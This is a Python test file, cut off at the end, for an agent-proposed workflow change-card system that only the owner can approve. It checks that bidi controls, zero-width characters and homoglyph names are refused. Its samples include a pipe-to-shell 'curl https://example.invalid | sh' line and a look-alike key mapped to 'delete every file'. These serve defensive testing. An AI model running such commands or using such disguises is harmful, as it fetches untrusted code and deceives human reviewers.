"""The ``workflow.save`` and ``workflow.update`` change cards: an agent asks, the owner saves.

The catalog half (params, preview, risk, apply plan, no undo) is pure. The end-to-end
half runs the REAL card routes, the REAL card hook and the REAL workflow-definition
handlers over a real ``WorkflowDefinitionLibrary`` in a temporary directory: the agent
proposes on the internal credential, its own direct write is refused, nothing is
saved until the owner's browser sends the card's step, a decline saves nothing, and
an update appends a revision while the earlier one stays.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any
from unittest.mock import MagicMock

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer
from guide_route_helpers import in_dashboard_turn

import kiro_crew.dashboard.handlers.workflows as workflow_handlers
from kiro_crew import change_card_catalog as catalog
from kiro_crew.dashboard import change_cards as cards
from kiro_crew.dashboard import change_cards_readers as readers
from kiro_crew.dashboard.change_cards import CardStore
from kiro_crew.dashboard.handlers import change_cards as routes
from kiro_crew.dashboard.handlers.workflows import (
    api_workflow_definition_update,
    api_workflow_definitions_create,
)
from kiro_crew.dashboard.state import _ChatSlot
from kiro_crew.workflows.library import WorkflowDefinitionLibrary, WorkflowSlugTakenError
from kiro_crew.workflows.validate import validate

SAVE = "workflow.save"
UPDATE = "workflow.update"
SLOT = "chat-1"
SK = f"dashboard:{SLOT}"

SOURCE_V1 = (
    'META = {"name": "investigate", "description": "Find the cause of a failure"}\n'
    "async def workflow(ctx):\n"
    '    return await ctx.agent("investigate")\n'
)
SOURCE_V2 = SOURCE_V1.replace('ctx.agent("investigate")', 'ctx.agent("investigate and report")')


def _save_params(**extra: Any) -> dict[str, Any]:
    return {"source": SOURCE_V1, "name": "Investigate", **extra}


# ── catalog ──


@pytest.mark.parametrize(
    "kind,params,code",
    [
        (SAVE, {"name": "x"}, "missing_param"),
        (SAVE, {"source": SOURCE_V1}, "missing_param"),
        (SAVE, {"source": "   ", "name": "x"}, "invalid_param"),
        (SAVE, {"source": "x" * (catalog.WORKFLOW_SOURCE_MAX + 1), "name": "x"}, "invalid_param"),
        (SAVE, {**_save_params(), "slug": "Not A Slug"}, "invalid_param"),
        # The library would save these as ``my-flow`` / ``a-b``: a different command.
        (SAVE, {**_save_params(), "slug": "my_flow"}, "invalid_param"),
        (SAVE, {**_save_params(), "slug": "a--b"}, "invalid_param"),
        # Few characters, but over the cap once encoded as the card store counts it.
        (SAVE, {"source": "\n".join(["# " + "—" * 50] * 40), "name": "x"}, "invalid_param"),
        (SAVE, {**_save_params(), "format": "task-plan"}, "unknown_param"),
        (SAVE, {**_save_params(), "derived_from": {}}, "unknown_param"),
        (UPDATE, {"source": SOURCE_V2}, "missing_param"),
        (UPDATE, {"workflow": "../x", "source": SOURCE_V2}, "invalid_param"),
        (UPDATE, {"workflow": "wfd_1", "source": SOURCE_V2, "slug": "x"}, "unknown_param"),
    ],
)
def test_bad_params_are_refused(kind, params, code):
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == code


def test_both_kinds_are_listed_for_list_change_kinds():
    listed = {k["id"] for k in catalog.list_kinds()}
    assert {SAVE, UPDATE} <= listed


def test_windows_line_ends_are_saved_as_the_card_shows_them():
    p = catalog.validate_params(SAVE, _save_params(source=SOURCE_V1.replace("\n", "\r\n")))
    assert p["source"] == SOURCE_V1.strip()


def test_save_preview_shows_the_whole_script_and_plans_the_library_post():
    p = catalog.validate_params(
        SAVE, _save_params(description="Find the cause", slug="investigate")
    )
    preview = catalog.build_preview(SAVE, p, {}, {})
    assert preview["title"] == "Save workflow “Investigate” to the library"
    assert preview["risk"] == "code_exec"
    assert preview["changes"] == [
        {"field": "name", "label": "Name", "after": "Investigate"},
        {"field": "description", "label": "Description", "after": "Find the cause"},
        {"field": "workflow_command", "label": "Command", "after": "/workflow investigate"},
        {"field": "workflow_source", "label": "Script", "after": SOURCE_V1.strip()},
    ]
    assert preview["apply"] == [
        {
            "method": "POST",
            "path": "/api/workflows/definitions",
            "body": {
                "source": SOURCE_V1.strip(),
                "name": "Investigate",
                "description": "Find the cause",
                "slug": "investigate",
                "exact_slug": True,
            },
        }
    ]
    assert preview["undo_unavailable_reason"] == catalog.UNDO_NO_IDENTITY_CHECK


def test_save_refuses_a_command_already_saved():
    p = catalog.validate_params(SAVE, _save_params(slug="investigate"))
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.build_preview(SAVE, p, {"slug": "investigate", "slug_taken": True}, {})
    assert exc.value.code == "slug_taken"


def _update_snapshot(**extra: Any) -> dict[str, Any]:
    return {
        "exists": True,
        "id": "wfd_0123456789abcdef",
        "slug": "investigate",
        "name": "Investigate",
        "description": "",
        "format": "python",
        "revision": 2,
        "content_hash": "h",
        **extra,
    }


def test_update_preview_shows_the_diff_and_pins_the_revision():
    p = catalog.validate_params(UPDATE, {"workflow": "investigate", "source": SOURCE_V2})
    diff = cards._workflow_diff(SOURCE_V1, SOURCE_V2)
    preview = catalog.build_preview(UPDATE, p, _update_snapshot(), {"diff": diff})
    assert preview["title"] == "Save a new revision of workflow “Investigate”"
    assert preview["risk"] == "code_exec"
    rows = {row["label"]: row for row in preview["changes"]}
    assert rows["Command"] == {
        "field": "workflow_command",
        "label": "Command",
        "after": "/workflow investigate",
    }
    # The person reads changed lines, not unified-diff headers.
    assert not any(line.startswith(("---", "+++", "@@")) for line in diff.splitlines())
    assert (rows["Revision"]["before"], rows["Revision"]["after"]) == (2, 3)
    assert rows["Changes to the script"]["after"] == diff
    assert '-    return await ctx.agent("investigate")' in diff
    assert rows["Script"]["detail"] is True
    assert preview["apply"] == [
        {
            "method": "PATCH",
            "path": "/api/workflows/definitions/wfd_0123456789abcdef",
            "body": {"source": SOURCE_V2.strip(), "expected_revision": 2},
        }
    ]
    assert preview["undo_unavailable_reason"] == catalog.UNDO_NO_IDENTITY_CHECK


def test_update_refuses_a_missing_or_non_python_definition_and_no_change():
    p = catalog.validate_params(UPDATE, {"workflow": "investigate", "source": SOURCE_V2})
    for snapshot, code in (
        ({"exists": False}, "not_found"),
        (_update_snapshot(format="task-plan"), "not_python"),
        (_update_snapshot(), "no_change"),
    ):
        with pytest.raises(catalog.CardCatalogError) as exc:
            catalog.build_preview(UPDATE, p, snapshot, {})
        assert exc.value.code == code


def test_update_that_only_renames_sends_the_new_name():
    p = catalog.validate_params(
        UPDATE, {"workflow": "investigate", "source": SOURCE_V1, "name": "Investigate v2"}
    )
    preview = catalog.build_preview(UPDATE, p, _update_snapshot(), {})
    assert {
        "field": "name",
        "label": "Name",
        "before": "Investigate",
        "after": "Investigate v2",
    } in (preview["changes"])
    assert preview["apply"][0]["body"]["name"] == "Investigate v2"


def test_a_diff_over_the_cap_is_refused_never_cut():
    old = "\n".join(f"old line {i}" for i in range(3000))
    new = "\n".join(f"new line {i}" for i in range(3000))
    with pytest.raises(catalog.CardCatalogError) as exc:
        cards._workflow_diff(old, new)
    assert exc.value.code == "diff_too_large"
    assert "smaller change" in exc.value.message
    assert "Workflows" in exc.value.message


def test_a_diff_under_the_cap_is_shown_whole():
    old = "\n".join(f"line {i}" for i in range(400))
    new = old.replace("line 399", "line 399 changed")
    diff = cards._workflow_diff(old, new)
    assert diff.split("\n")[-2:] == ["-line 399", "+line 399 changed"]
    assert "more diff lines" not in diff


def test_one_changed_line_in_a_long_script_of_repeated_lines_is_one_small_hunk():
    # The repeated line makes up far more than 1% of this script: matched with
    # difflib's autojunk it is never anchored, and the one change diffs as all
    # 600 lines rewritten.
    old = "async def workflow(ctx):\n" + "\n".join(["    await ctx.agent('check')"] * 300)
    new = old.replace("ctx.agent('check')", "ctx.agent('wipe')", 1)
    lines = cards._workflow_diff(old, new).split("\n")
    assert "+    await ctx.agent('wipe')" in lines
    assert "-    await ctx.agent('check')" in lines
    assert len(lines) < 20


@pytest.mark.parametrize(
    "old_line,new_line",
    [
        # Marked as changed these read ``--- x`` / ``+++ y``: the file-header shape.
        ("-- x", "++ y"),
        # A removed ``--dry-run`` reads ``---dry-run``.
        ("--dry-run", "--force"),
        # A markdown rule inside a prompt reads ``----`` once removed.
        ("---", "***"),
        # A source line shaped like a hunk header is still a source line.
        ("@@ -1 +1 @@", "@@ -2 +2 @@"),
    ],
)
def test_every_changed_line_reaches_the_diff(old_line, new_line):
    old = f'PROMPT = """\nkeep\n{old_line}\nkeep too\n"""\n'
    new = f'PROMPT = """\nkeep\n{new_line}\nkeep too\n"""\n'
    lines = cards._workflow_diff(old, new).splitlines()
    assert f"-{old_line}" in lines
    assert f"+{new_line}" in lines
    # The changed pair and their context under one separator row: no file or
    # hunk header survives.
    assert lines == [
        "\u22ef lines 1-6 \u22ef",
        ' PROMPT = """',
        " keep",
        f"-{old_line}",
        f"+{new_line}",
        " keep too",
        ' """',
        " ",
    ]


def test_far_apart_hunks_are_split_by_a_row_naming_their_lines():
    old = "\n".join(f"line {i}" for i in range(40))
    new = old.replace("line 2\n", "--line 2\n").replace("line 30\n", "---\n")
    lines = cards._workflow_diff(old, new).splitlines()
    assert "-line 2" in lines and "+--line 2" in lines
    assert "-line 30" in lines and "+---" in lines
    assert not any(line.startswith("@@") for line in lines)
    # Each hunk opens with a row naming the new revision's lines it spans, so the
    # second hunk never reads as part of the first.
    assert lines[0] == "\u22ef lines 1-6 \u22ef"
    gap = lines.index("\u22ef lines 28-34 \u22ef")
    assert lines[gap - 1] == " line 5" and lines[gap + 1] == " line 27"
    assert [line for line in lines if line.startswith("\u22ef")] == [
        "\u22ef lines 1-6 \u22ef",
        "\u22ef lines 28-34 \u22ef",
    ]


def test_a_hunk_that_removes_lines_names_the_new_lines_around_it():
    old = "\n".join(f"line {i}" for i in range(20))
    new = old.replace("line 10\nline 11\n", "")
    lines = cards._workflow_diff(old, new).splitlines()
    assert "-line 10" in lines and "-line 11" in lines
    # Three context lines either side: new lines 8-10, then 11-13, the numbers the
    # card's script block shows, never the old revision's 8-15.
    assert lines[0] == "\u22ef lines 8-13 \u22ef"


@pytest.mark.parametrize(
    "header,row",
    [
        ("@@ -9,8 +8,6 @@", "\u22ef lines 8-13 \u22ef"),
        ("@@ -3 +3 @@", "\u22ef lines 3-3 \u22ef"),
        # Removes old lines 11-12 and adds none: named by the new line before them.
        ("@@ -11,2 +10,0 @@", "\u22ef after line 10 \u22ef"),
    ],
)
def test_a_hunk_separator_names_the_new_revisions_lines(header, row):
    match = readers._HUNK_HEADER_RE.fullmatch(header)
    assert match is not None
    assert readers._hunk_separator(match) == row


@pytest.mark.parametrize("char", ["\u2028", "\u202e", "\u200b", "\ufe00", "\x07", "\U000e0100"])
def test_a_removed_line_shows_its_hidden_characters_spelled_out(char):
    # Saved earlier from the Workflows tab, which never ran the card's checks.
    old = SOURCE_V1 + f'NOTE = "a{char}b"\n'
    new = SOURCE_V1 + 'NOTE = "ab"\n'
    lines = cards._workflow_diff(old, new).split("\n")
    cp = ord(char)
    spelled = f"\\u{cp:04X}" if cp <= 0xFFFF else f"\\U{cp:08X}"
    assert f'-NOTE = "a{spelled}b"' in lines
    assert not any(char in line for line in lines)
    assert '+NOTE = "ab"' in lines


def test_neither_card_offers_undo():
    for kind, params in (
        (SAVE, _save_params()),
        (UPDATE, {"workflow": "investigate", "source": SOURCE_V2}),
    ):
        p = catalog.validate_params(kind, params)
        plan, reason = catalog.build_undo(kind, p, {}, [{}], 1)
        assert plan is None and reason == catalog.UNDO_NO_IDENTITY_CHECK


def test_the_library_routes_are_hooked_but_write_no_memory_line():
    for route in (
        ("POST", "/api/workflows/definitions"),
        ("PATCH", "/api/workflows/definitions/{workflow_ref}"),
    ):
        assert route in catalog.HOOKED_ROUTES
        assert route not in catalog.MEMORY_ROUTES


# ── end to end: real card routes, real hook, real definition routes ──


class _Service:
    """The workflow service's definition calls, over a real library on disk."""

    def __init__(self, library: WorkflowDefinitionLibrary) -> None:
        self.library = library

    def get_definition(self, workflow_ref: str):
        return self.library.get(workflow_ref)

    def save_definition(
        self, source: str, *, name="", description="", slug="", exact_slug=False, **_kw
    ):
        result = validate(source)
        if not result.ok:
            return {"ok": False, "error": "; ".join(result.errors), "errors": result.errors}
        try:
            definition = self.library.create(
                source=source,
                name=name,
                description=description,
                slug=slug,
                exact_slug=exact_slug,
            )
        except WorkflowSlugTakenError as exc:
            return {"ok": False, "error": str(exc), "errors": [str(exc)], "slug_taken": True}
        return {"ok": True, "definition": definition}

    def update_definition(self, workflow_ref: str, *, source: str, expected_revision: int, **kw):
        current = self.library.get(workflow_ref)
        if current is None:
            return {"ok": False, "error": "no such saved workflow", "not_found": True}
        updated = self.library.update(
            current["id"], source=source, expected_revision=expected_revision, **kw
        )
        if updated is None:
            return {"ok": False, "error": "newer revision", "conflict": True}
        return {"ok": True, "definition": updated}


class _State:
    """The slice of ``DashboardState`` the card routes and the definition routes read."""

    owner_id = ""

    def __init__(self, service: _Service | None) -> None:
        self._slots: dict[str, _ChatSlot] = {SLOT: in_dashboard_turn(_ChatSlot(SLOT))}
        self._change_card_store = CardStore(None)
        self.workflow_service = service
        self.conversation_log = None
        self.push_slots_update = MagicMock()

    def get_slot(self, name: str):
        return self._slots.get(name)

    async def deliver_ws_owners(self, kind: str, payload: dict[str, Any]) -> int:
        return 1

    def broadcast_ws(self, kind: str, payload: dict[str, Any]) -> None:
        return None


@web.middleware
async def _fake_auth(request: web.Request, handler):
    if request.headers.get("X-Test-Auth") == "internal":
        # The internal credential carries no ``app`` claim, as on the real gateway,
        # so the definition routes' dashboard-user gate refuses it.
        request["user"] = "kiro-cli"
        request["internal_auth"] = True
        request["peer_verified"] = True
        if request.headers.get("X-Test-App"):
            request["app"] = request.headers["X-Test-App"]
    else:
        request["app"] = ""
        request["user"] = "local-app"
    return await handler(request)


class _Audit:
    def __init__(self) -> None:
        self.rows: list[dict[str, Any]] = []

    def log_api_access(self, **kwargs: Any) -> None:
        self.rows.append(kwargs)

    def operations(self) -> list[tuple[str, str]]:
        """The card rows that name a workflow card, and the definition routes' own rows."""
        return [
            (str(r["operation"]), str(r["outcome"]))
            for r in self.rows
            if " workflow." in str(r.get("resources") or "")
            or str(r["operation"]).startswith("workflow_definition_")
        ]


def _run(state: _State, fn, monkeypatch):
    audit = _Audit()
    monkeypatch.setattr(routes, "sel", lambda: audit)
    monkeypatch.setattr(workflow_handlers, "_sel", lambda: audit)

    async def main():
        app = web.Application(middlewares=[_fake_auth, routes.change_card_middleware])
        app["state"] = state
        routes.register_change_card_routes(app)
        app.router.add_post("/api/workflows/definitions", api_workflow_definitions_create)
        app.router.add_patch(
            "/api/workflows/definitions/{workflow_ref}", api_workflow_definition_update
        )
        async with TestClient(TestServer(app)) as client:
            await fn(client)
            if routes._BACKGROUND:
                await asyncio.gather(*list(routes._BACKGROUND))

    asyncio.run(main())
    return audit


AGENT = {"X-Test-Auth": "internal", "X-Session-Key": SK}


def _step(card: dict[str, Any]) -> dict[str, str]:
    return {
        "X-Test-Auth": "owner",
        "X-Card-Id": card["id"],
        "X-Card-Revision": str(card["revision"]),
        "X-Card-Op": "apply",
        "X-Card-Step": "0",
    }


async def _propose(c: TestClient, kind: str, params: dict[str, Any], headers=AGENT):
    return await c.post(
        "/api/cards/agent/propose", json={"kind": kind, "params": params}, headers=headers
    )


def test_agent_proposes_and_only_the_owners_press_saves(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    state = _State(_Service(library))

    async def go(c):
        # The agent cannot write the library itself...
        r = await c.post(
            "/api/workflows/definitions", json={"source": SOURCE_V1, "name": "x"}, headers=AGENT
        )
        assert r.status == 403, await r.text()
        assert library.list() == []
        # ...it proposes the card, which saves nothing yet.
        r = await _propose(c, SAVE, _save_params(slug="investigate"))
        assert r.status == 200, await r.text()
        card = await r.json()
        assert card["kind"] == SAVE and card["risk"] == "code_exec"
        assert library.list() == []
        step = card["plan"]["apply"][0]
        # The agent's own credential cannot press the card's button.
        r = await c.post(step["path"], json=step["body"], headers={**_step(card), **AGENT})
        assert r.status == 403
        assert library.list() == []
        # The owner's browser saves it through the Workflows tab's own route.
        r = await c.post(step["path"], json=step["body"], headers=_step(card))
        assert r.status == 201, await r.text()
        saved = library.list()
        assert [(d["name"], d["slug"], d["source"]) for d in saved] == [
            ("Investigate", "investigate", SOURCE_V1.strip())
        ]
        r = await c.get(f"/api/cards/agent/status?card_id={card['id']}", headers=AGENT)
        applied = await r.json()
        assert applied["status"] == "applied", applied
        assert not applied["plan"].get("undo")

    audit = _run(state, go, monkeypatch)
    assert audit.operations() == [
        ("workflow_definition_create", "denied"),
        ("cards.propose", "ok"),
        ("workflow_definition_create", "allowed"),
    ]


def test_a_declined_card_saves_nothing(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, SAVE, _save_params())
        card = await r.json()
        r = await c.post(
            f"/api/cards/{card['id']}/cancel",
            json={"revision": card["revision"]},
            headers={"X-Test-Auth": "owner"},
        )
        assert r.status == 200, await r.text()
        assert (await r.json())["status"] == "cancelled"
        step = card["plan"]["apply"][0]
        r = await c.post(step["path"], json=step["body"], headers=_step(card))
        assert r.status >= 400
        assert library.list() == []

    audit = _run(state, go, monkeypatch)
    assert audit.operations() == [("cards.propose", "ok"), ("cards.decline", "rejected")]


def test_an_update_appends_a_revision_and_keeps_the_old_one(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    created = library.create(source=SOURCE_V1, name="Investigate", slug="investigate")
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, UPDATE, {"workflow": "investigate", "source": SOURCE_V2})
        assert r.status == 200, await r.text()
        card = await r.json()
        labels = [row["label"] for row in card["changes"]]
        assert "Changes to the script" in labels
        assert library.get(created["id"])["revision"] == 1
        step = card["plan"]["apply"][0]
        assert step["path"] == f"/api/workflows/definitions/{created['id']}"
        r = await c.patch(step["path"], json=step["body"], headers=_step(card))
        assert r.status == 200, await r.text()
        current = library.get(created["id"])
        assert current["revision"] == 2
        assert current["source"] == SOURCE_V2.strip()
        assert [rev["source"] for rev in current["revisions"]] == [SOURCE_V1, SOURCE_V2.strip()]

    _run(state, go, monkeypatch)


def test_an_update_refuses_a_revision_saved_after_the_preview(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    created = library.create(source=SOURCE_V1, name="Investigate", slug="investigate")
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, UPDATE, {"workflow": "investigate", "source": SOURCE_V2})
        card = await r.json()
        other = SOURCE_V1.replace('ctx.agent("investigate")', 'ctx.agent("look into it")')
        library.update(created["id"], source=other, expected_revision=1)
        step = card["plan"]["apply"][0]
        r = await c.patch(step["path"], json=step["body"], headers=_step(card))
        assert r.status == 409, await r.text()
        assert library.get(created["id"])["source"] == other

    _run(state, go, monkeypatch)


def test_a_taken_command_never_becomes_a_card(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    library.create(source=SOURCE_V1, name="Investigate", slug="investigate")
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, SAVE, _save_params(slug="investigate"))
        assert r.status == 400, await r.text()
        assert (await r.json())["code"] == "slug_taken"
        r = await _propose(c, SAVE, _save_params(slug="investigate-deeper"))
        assert r.status == 200, await r.text()

    _run(state, go, monkeypatch)


def test_a_command_taken_after_the_preview_is_refused(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, SAVE, _save_params(slug="investigate"))
        card = await r.json()
        library.create(source=SOURCE_V1, name="Other", slug="investigate")
        step = card["plan"]["apply"][0]
        r = await c.post(step["path"], json=step["body"], headers=_step(card))
        assert r.status == 409, await r.text()
        assert [d["name"] for d in library.list()] == ["Other"]

    _run(state, go, monkeypatch)


def test_a_command_taken_after_the_apply_check_is_refused_not_suffixed(tmp_path, monkeypatch):
    """A save landing between Apply's re-read and the create: the create itself refuses."""
    library = WorkflowDefinitionLibrary(tmp_path)
    service = _Service(library)
    state = _State(service)

    async def go(c):
        r = await _propose(c, SAVE, _save_params(slug="investigate"))
        card = await r.json()
        library.create(source=SOURCE_V1, name="Other", slug="investigate")
        # Apply's re-read still finds the command free, as it would in the gap.
        monkeypatch.setattr(service, "get_definition", lambda ref: None)
        step = card["plan"]["apply"][0]
        r = await c.post(step["path"], json=step["body"], headers=_step(card))
        assert r.status == 409, await r.text()
        assert (await r.json())["code"] == "workflow_slug_taken"
        assert [(d["name"], d["slug"]) for d in library.list()] == [("Other", "investigate")]

    _run(state, go, monkeypatch)


def test_the_library_keeps_an_exact_slug_or_refuses(tmp_path):
    library = WorkflowDefinitionLibrary(tmp_path)
    library.create(source=SOURCE_V1, name="Other", slug="investigate")
    with pytest.raises(WorkflowSlugTakenError):
        library.create(source=SOURCE_V1, name="Mine", slug="investigate", exact_slug=True)
    # Without the flag the library still suffixes, as the Workflows tab expects.
    suffixed = library.create(source=SOURCE_V1, name="Mine", slug="investigate")
    assert suffixed["slug"] == "investigate-2"
    fresh = library.create(source=SOURCE_V1, name="New", slug="fresh", exact_slug=True)
    assert fresh["slug"] == "fresh"


def test_an_update_diff_read_against_another_revision_is_refused(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    created = library.create(source=SOURCE_V1, name="Investigate", slug="investigate")
    service = _Service(library)
    state = _State(service)
    real_get = service.get_definition
    reads = {"n": 0}

    def get_definition(ref):
        # The second read (the diff's) sees a save that landed after the first.
        reads["n"] += 1
        if reads["n"] == 2:
            other = SOURCE_V1.replace('ctx.agent("investigate")', 'ctx.agent("look into it")')
            library.update(created["id"], source=other, expected_revision=1)
        return real_get(ref)

    monkeypatch.setattr(service, "get_definition", get_definition)

    async def go(c):
        r = await _propose(c, UPDATE, {"workflow": "investigate", "source": SOURCE_V2})
        assert r.status == 400, await r.text()
        assert (await r.json())["code"] == "workflow_changed"
        assert state._change_card_store.pending(None) == []

    _run(state, go, monkeypatch)


def _max_script(mark: str) -> str:
    """A valid script just under the card cap once encoded: every line escapes."""
    head = 'META = {"name": "big"}\nasync def workflow(ctx):\n    return 1\n'
    lines = [head]
    while len(json.dumps("".join(lines))) - 2 < catalog.WORKFLOW_SOURCE_MAX - 40:
        lines.append(f'# —"{mark}"—\n')
    return "".join(lines)


def test_an_update_whose_whole_diff_is_over_the_cap_never_becomes_a_card(tmp_path, monkeypatch):
    # Every line changes, with the one that matters last: a cut diff would hide it.
    library = WorkflowDefinitionLibrary(tmp_path)
    old, new = _max_script("a"), _max_script("b")
    assert validate(new).ok
    library.create(source=old, name="Big", slug="big")
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, UPDATE, {"workflow": "big", "source": new})
        assert r.status == 400, await r.text()
        assert (await r.json())["code"] == "diff_too_large"
        assert state._change_card_store.pending(None) == []

    _run(state, go, monkeypatch)


def test_a_max_size_update_of_one_non_ascii_line_still_fits_one_card(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    old = _max_script("a")
    new = old.replace('# —"a"—\n', '# —"b"—\n', 1)
    assert validate(new).ok
    library.create(source=old, name="Big", slug="big")
    state = _State(_Service(library))

    async def go(c):
        r = await _propose(c, UPDATE, {"workflow": "big", "source": new})
        assert r.status == 200, await r.text()
        card = await r.json()
        diff = next(row for row in card["changes"] if row.get("field") == "workflow_diff")
        assert '-# —"a"—' in diff["after"].split("\n")
        assert '+# —"b"—' in diff["after"].split("\n")

    _run(state, go, monkeypatch)


def test_a_plain_workflows_tab_save_passes_the_card_hook_untouched(tmp_path, monkeypatch):
    library = WorkflowDefinitionLibrary(tmp_path)
    state = _State(_Service(library))

    async def go(c):
        body = {"source": SOURCE_V1, "name": "By hand", "slug": "by_hand"}
        r = await c.post("/api/workflows/definitions", json=body, headers={"X-Test-Auth": "owner"})
        assert r.status == 201, await r.text()
        # The route's own slug rule, not the card's: no card is involved.
        assert [d["slug"] for d in library.list()] == ["by-hand"]

    _run(state, go, monkeypatch)


def test_an_invalid_script_never_becomes_a_card(tmp_path, monkeypatch):
    state = _State(_Service(WorkflowDefinitionLibrary(tmp_path)))

    async def go(c):
        r = await _propose(
            c, SAVE, _save_params(source="import os\nasync def workflow(ctx):\n    pass\n")
        )
        assert r.status == 400, await r.text()
        assert (await r.json())["code"] == "invalid_workflow"
        assert state._change_card_store.pending(None) == []

    _run(state, go, monkeypatch)


def test_no_card_without_the_workflow_service(monkeypatch):
    state = _State(None)

    async def go(c):
        r = await _propose(c, SAVE, _save_params())
        assert r.status == 400, await r.text()
        assert (await r.json())["code"] == "workflows_unavailable"

    _run(state, go, monkeypatch)


def test_a_crewmate_cannot_propose_a_saved_workflow(tmp_path, monkeypatch):
    from kiro_crew.dashboard import mate_thread_wakes

    monkeypatch.setattr(mate_thread_wakes, "is_crewmate_thread", lambda slot: True)
    library = WorkflowDefinitionLibrary(tmp_path)
    state = _State(_Service(library))

    async def go(c):
        for kind, params in (
            (SAVE, _save_params()),
            (UPDATE, {"workflow": "investigate", "source": SOURCE_V2}),
        ):
            r = await _propose(c, kind, params)
            assert r.status == 403, await r.text()
            assert (await r.json())["code"] == "owner_assistant_only"
        assert state._change_card_store.pending(None) == []

    _run(state, go, monkeypatch)


def test_a_subagent_cannot_propose_a_saved_workflow(tmp_path, monkeypatch):
    state = _State(_Service(WorkflowDefinitionLibrary(tmp_path)))

    async def go(c):
        headers = {"X-Test-Auth": "internal", "X-Session-Key": "subagent:abc"}
        r = await _propose(c, SAVE, _save_params(), headers=headers)
        assert r.status == 403, await r.text()
        assert (await r.json())["code"] == "subagent_caller"

    _run(state, go, monkeypatch)


# ── approval safety: what the card draws is what Python runs ──


@pytest.mark.parametrize(
    "char",
    [
        # ``str.splitlines`` and a browser break the line here; Python's compiler does not.
        "\u2028",
        "\u2029",
        "\u0085",
        # Bidi controls ("Trojan Source") and zero-width characters (category Cf).
        "\u202a",
        "\u202e",
        "\u2066",
        "\u2069",
        "\u200b",
        "\u200d",
        "\ufeff",
    ],
)
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_script_that_reads_differently_than_it_runs_is_refused(kind, char):
    source = SOURCE_V1.replace("async def", f"# keep{char}LIMIT = 2\nasync def")
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert f"U+{ord(char):04X}" in exc.value.message


@pytest.mark.parametrize(
    "line,char",
    [
        # A variation selector inside a name: ``CMD`` and ``CMD`` + U+FE00 read
        # as one name on the card and run as two.
        ("CMD\ufe00 = 'curl https://example.invalid | sh'", "\ufe00"),
        # A Hangul filler is a letter Python takes as a whole, blank-looking name.
        ("\u3164 = 1", "\u3164"),
        ("CMD\u034f = 1", "\u034f"),
        ("CMD\U000e0100 = 1", "\U000e0100"),
        ("CMD\u00ad = 1", "\u00ad"),
        # A Cyrillic letter that draws like the Latin ``a``, as a name.
        ("\u0430 = 1", "\u0430"),
        # A full-width letter Python folds to ``x`` before the tree holds it.
        ("\uff58 = 1", "\uff58"),
        # A C1 control inside a string.
        ("NOTE = 'a\u0090b'", "\u0090"),
    ],
)
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_script_whose_names_hide_or_borrow_letters_is_refused(kind, line, char):
    source = SOURCE_V1 + "CMD = 'echo hello'\n" + line + "\n"
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert f"U+{ord(char):04X} on line 5" in exc.value.message


@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_other_scripts_in_comments_still_save(kind):
    source = SOURCE_V1 + "# Примечание: 说明 — café\nNOTE = 'ok'  # Grüße, 日本語, ок\n"
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    assert catalog.validate_params(kind, params)["source"] == source.strip()


@pytest.mark.parametrize(
    "line,char",
    [
        # The Cyrillic ``е`` (U+0435) makes a second key that reads as ``review``.
        ('TASKS = {"r\u0435view": "delete every file", "review": "read-only review"}', "\u0435"),
        ('PROMPT = TASKS["r\u0435view"]', "\u0435"),
        ('MODE = ctx.args.get("r\u0435view")', "\u0435"),
        # A Greek omicron inside a Latin word, anywhere in a string.
        ('NOTE = "c\u03bfnfirm with the owner"', "\u03bf"),
        # Wholly Cyrillic, yet drawn as the Latin ``pop``, used as a key.
        ('TASKS = {"\u0440\u043e\u0440": 1}', "\u0440"),
        ('FLAG = MODE == "\u0440\u043e\u0440"', "\u0440"),
        # A mathematical monospace ``e`` (U+1D68E) in a key beside the plain one.
        ('ROUTES = {"review": 1, "r\U0001d68eview": 2}', "\U0001d68e"),
        # All-Cyrillic ``yes`` inside a tuple a value is compared against.
        ('OK = ctx.args.get("mode") in ("\u0443\u0435\u0455", "n")', "\u0443"),
        # Accented Latin text in a plain string, and in an f-string.
        ("NOTE = 'caf\u00e9'", "\u00e9"),
        ("NOTE = f'{CMD} caf\u00e9'", "\u00e9"),
        # Outside any token a comment could own (before one, since a trailing
        # space at the end of the script is stripped with the rest of it).
        ("X = 1 \u00a0# note", "\u00a0"),
    ],
)
@pytest.mark.parametrize("kind", [SAVE, UPDATE])
def test_a_non_ascii_character_in_code_or_a_string_is_refused(kind, line, char):
    source = SOURCE_V1 + "CMD = 'echo hello'\n" + line + "\n"
    params = _save_params(source=source) if kind == SAVE else {"workflow": "x", "source": source}
    with pytest.raises(catalog.CardCatalogError) as exc:
        catalog.validate_params(kind, params)
    assert exc.value.code == "invalid_param"
    assert f"U+{ord(char):04X} on line 5" in exc.value.message
    assert (
        "non-ASCII text in code or strings is not accepted on an agent-proposed "
        "workflow card; save it from the Workflows tab instead"
